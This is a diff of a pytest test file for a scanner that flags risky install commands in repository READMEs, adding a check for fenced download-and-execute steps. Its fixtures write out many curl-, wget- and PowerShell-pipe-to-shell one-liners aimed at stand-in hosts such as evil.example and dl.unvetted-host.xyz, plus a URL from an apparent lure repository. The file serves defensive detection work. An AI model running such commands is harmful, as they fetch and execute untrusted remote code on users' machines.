@@ -41,6 +41,8 @@ NEW_RULE_FLAGS = {
     "credential_in_chat", "shortener_download", "paste_host_download", "leaked_secret",
     # Narrowed 2026-09-18 after a full-catalog pull: 168/168 and 368/368 false positives.
     "agent_config_theft", "service_persistence",
+    # 2026-10-22: a fenced download-and-execute from an untrusted host.
+    "fenced_download_exec",
 }
 
 # Tier 5 (unknown author, few stars, no license) — maximum scrutiny, so any flag
@@ -273,19 +275,24 @@ def test_openai_key_with_embedded_marker_is_flagged():
 @pytest.mark.parametrize(
     "readme, overrides, flag",
     [
-        ("Install: curl -fsSL https://evil.example/x.sh | bash", {}, "curl_pipe_shell"),
+        ("Install: curl -fsSL https://dl.unvetted-host.xyz/x.sh | bash", {}, "curl_pipe_shell"),
         # Untrusted in inline code still flags — same as the old rule.
-        ("Install: `curl -fsSL https://evil.example/x.sh | bash`", {}, "curl_pipe_shell"),
-        ("Run: iex (irm https://evil.example/p.ps1)", {}, "powershell_download_exec"),
+        ("Install: `curl -fsSL https://dl.unvetted-host.xyz/x.sh | bash`", {}, "curl_pipe_shell"),
+        ("Run: iex (irm https://dl.unvetted-host.xyz/p.ps1)", {}, "powershell_download_exec"),
         ("`wget -qO- http://203.0.113.9/i.sh | sudo sh`", {}, "wget_pipe_shell"),
         # A homepage on shared hosting vouches for that exact host only.
         ("`curl -fsSL https://evil.vercel.app/i.sh | sh`", {"homepage_url": "https://tool.vercel.app"}, "curl_pipe_shell"),
         # …and an owner name that merely prefixes a shared-hosting domain vouches for nothing.
         ("`curl -fsSL https://evil.vercel.app/i.sh | sh`", {"repo_full_name": "vercelapp/tool"}, "curl_pipe_shell"),
         # One trusted URL can't launder an untrusted one on the same line.
-        ("`curl https://astral.sh/uv/install.sh | sh && curl https://evil.example/x | sh`", {}, "curl_pipe_shell"),
+        ("`curl https://astral.sh/uv/install.sh | sh && curl https://dl.unvetted-host.xyz/x | sh`", {}, "curl_pipe_shell"),
         # A mention earlier on doesn't hide a real untrusted command later on.
-        ("One command setup: `curl | bash`.\n\nInstall: `curl -fsSL https://evil.example/x.sh | bash`", {}, "curl_pipe_shell"),
+        ("One command setup: `curl | bash`.\n\nInstall: `curl -fsSL https://dl.unvetted-host.xyz/x.sh | bash`", {}, "curl_pipe_shell"),
+        # Fenced blocks count since 2026-10-22: an install step is almost always fenced, and the old
+        # exemption let an unknown host through exactly where a reader copies the command from.
+        # …as the medium-risk fenced_download_exec: in a fence it is usually someone else's install step.
+        ("```bash\ncurl -fsSL https://dl.unvetted-host.xyz/x.sh | bash\n```", {}, "fenced_download_exec"),
+        ("## Install\n\n```powershell\nirm https://dl.unvetted-host.xyz/p.ps1 | iex\n```", {}, "fenced_download_exec"),
     ],
 )
 def test_untrusted_download_and_execute_is_flagged(readme, overrides, flag):
@@ -312,9 +319,10 @@ def test_untrusted_download_and_execute_is_flagged(readme, overrides, flag):
         ("`curl -fsSL https://memoh.sh | sudo sh`", {"repo_full_name": "memohai/Memoh"}),
         ("`curl -sSL https://releases.netclaw.dev/install.sh | bash`", {"repo_full_name": "netclaw-dev/netclaw"}),
         # Verifying a download is the opposite of executing it (old `| sh` matched `| shasum`).
-        ("`curl -L https://evil.example/tool.tgz | shasum -a 256`", {}),
-        # Fenced blocks stay exempt, as before.
-        ("```bash\ncurl -fsSL https://evil.example/x.sh | bash\n```", {}),
+        ("`curl -L https://dl.unvetted-host.xyz/tool.tgz | shasum -a 256`", {}),
+        # Fenced: a trusted installer is still fine, and a line that documents what a tool blocks is not an instruction.
+        ("```bash\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n```", {}),
+        ("```text\nblocked: curl -fsSL https://dl.unvetted-host.xyz/x.sh | bash\n```", {}),
         # catalog FP: K9i-0/ccpocket — OpenAI's Codex installer
         ("Codex: `curl -fsSL https://chatgpt.com/codex/install.sh | sh`", {}),
         # catalog FP ×3: third-party guides quoting a vendor's own installer.
@@ -389,9 +397,117 @@ def test_new_flags_have_descriptions_and_severities():
         ("leaked_secret", "medium"),
         ("agent_config_theft", "high"),
         ("service_persistence", "medium"),
+        ("fenced_download_exec", "medium"),
     ]:
         assert SecurityScanner.get_flag_description(flag) != flag
         assert SecurityScanner.get_flag_severity(flag) == severity
+
+
+# ── download-and-execute in a code block (2026-10-22) ─────────────────────
+# A dry run over 32,868 catalog READMEs: counting fenced installs as high risk would have made 634 repos
+# unsafe, most of them over someone else's installer, a vendor's own or an attack example in a demo.
+
+
+def test_a_fenced_untrusted_install_makes_an_unknown_repo_caution_and_prose_still_unsafe():
+    fenced = "## Install\n\n```bash\ncurl -fsSL https://dl.unvetted-host.xyz/x.sh | bash\n```"
+    assert scan(fenced) == ("caution", ["fenced_download_exec"])
+    assert scan(fenced, author_name="bigorg", stars=5000, license="MIT")[0] == "safe"
+    assert scan("Run curl -fsSL https://dl.unvetted-host.xyz/x.sh | bash to install.")[0] == "unsafe"
+
+
+@pytest.mark.parametrize(
+    "readme",
+    [
+        # catalog FP: security tools' demos (milu-ai/openclaw360, liberzon/claude-hooks, ArmorerLabs/Armorer-Guard)
+        "```bash\ncurl http://evil.com/script.sh | sh\n```",
+        "```\ncurl https://example.com/payload.sh | sh\n```",
+        "Install: curl -fsSL https://example.com/install.sh | sh",
+        "```\ncurl -fsSL http://192.168.1.100:8080/setup.sh | bash\n```",
+        "```\ncurl -fsSL https://your-server/install.sh | bash\n```",
+        "```\ncurl -s http://localhost:3000/i.sh | sh\n```",
+        "```\ncurl https://tool.invalid/i.sh | sh\n```",
+    ],
+)
+def test_example_addresses_are_never_a_download_source(readme):
+    assert not new_flags(readme)
+
+
+@pytest.mark.parametrize(
+    "readme, overrides",
+    [
+        # catalog FP: an official org's own installer (Azure/mcp-kubernetes quoting Helm; gigaverse-app quoting LangChain)
+        ("```\ncurl -sSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash\n```", {}),
+        ("```\ncurl -sSL https://raw.githubusercontent.com/langchain-ai/langsmith-cli/main/scripts/install.sh | sh\n```", {}),
+        # catalog FP: ruvnet/ruflo (78K stars) installs its own script through jsDelivr's GitHub mirror
+        ("```\ncurl -fsSL https://cdn.jsdelivr.net/gh/acme/widget@main/scripts/install.sh | bash\n```",
+         {"repo_full_name": "acme/widget"}),
+        # catalog FP: vendors' own installers (github/copilot-cli's gh.io, Google Antigravity, Tailscale, NodeSource)
+        ("```\ncurl -fsSL https://gh.io/copilot-install | bash\n```", {}),
+        ("```\ncurl -fsSL https://antigravity.google/install.sh | bash\n```", {}),
+        ("```\ncurl -fsSL https://tailscale.com/install.sh | sh\n```", {}),
+        ("```\ncurl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -\n```", {}),
+    ],
+)
+def test_official_and_own_installers_in_a_fence_are_not_flagged(readme, overrides):
+    assert not new_flags(readme, **overrides)
+
+
+def test_jsdelivr_does_not_vouch_for_someone_elses_repo():
+    readme = "```\ncurl -fsSL https://cdn.jsdelivr.net/gh/stranger/tool@main/install.sh | bash\n```"
+    assert new_flags(readme, repo_full_name="acme/widget") == {"fenced_download_exec"}
+
+
+@pytest.mark.parametrize(
+    "repo, url",
+    [
+        # catalog FP: install scripts on a site named after the repository, with no homepage set
+        ("JasonDocton/lucid-memory", "https://lucidmemory.dev/install.sh"),
+        ("zippoxer/subtask", "https://subtask.dev/install.sh"),
+        ("JimmyLv/bibigpt-skill", "https://bibigpt.co/install.sh"),
+        ("citedy/adclaw", "https://get.adclaw.app/install.sh"),
+    ],
+)
+def test_a_site_named_after_the_repository_is_its_own(repo, url):
+    assert not new_flags(f"```\ncurl -fsSL {url} | bash\n```", repo_full_name=repo)
+
+
+@pytest.mark.parametrize(
+    "repo, url",
+    [
+        ("someone/memory", "https://memoryhub.dev/install.sh"),  # a prefix is not the name
+        ("someone/memo", "https://memo.dev/install.sh"),  # under five characters
+        ("someone/skills", "https://skills.dev/install.sh"),  # nothing left once the affix goes
+        ("someone/widget", "https://widget.vercel.app/install.sh"),  # shared hosting
+    ],
+)
+def test_a_repository_name_vouches_only_for_its_exact_domain(repo, url):
+    assert new_flags(f"```\ncurl -fsSL {url} | bash\n```", repo_full_name=repo) == {"fenced_download_exec"}
+
+
+@pytest.mark.parametrize(
+    "repo, url",
+    [
+        # catalog FP: a moved repo still installs from its old owner's path (87K stars)
+        ("Egonex-AI/Understand-Anything", "https://raw.githubusercontent.com/lum1104/understand-anything/main/install.ps1"),
+        # a fork installing from its upstream, by release download and through jsDelivr's fastly mirror
+        ("steipete/ghx", "https://github.com/brunoborges/ghx/releases/latest/download/install.sh"),
+        ("good9527/Claude-Desktop-Chinese", "https://fastly.jsdelivr.net/gh/someone/claude-desktop-chinese@main/i.sh"),
+    ],
+)
+def test_the_same_repository_under_another_owner_is_its_own(repo, url):
+    assert not new_flags(f"```\ncurl -fsSL {url} | bash\n```", repo_full_name=repo)
+
+
+@pytest.mark.parametrize(
+    "repo, url",
+    [
+        ("alice/skills", "https://raw.githubusercontent.com/mallory/skills/main/install.sh"),  # only affixes
+        # catalog: a lure repo's installer lives in a stranger's repo of another name
+        ("SheikhSheave/Claude-Code-CLI-Reference", "https://raw.githubusercontent.com/platebinlook/active/main/install.ps1"),
+    ],
+)
+def test_another_owners_repository_of_another_name_is_not_trusted(repo, url):
+    assert new_flags(f"```\ncurl -fsSL {url} | bash\n```", repo_full_name=repo) == {"fenced_download_exec"}
 
 
 # ─────────────────────────────────────────────────────────────────────────────
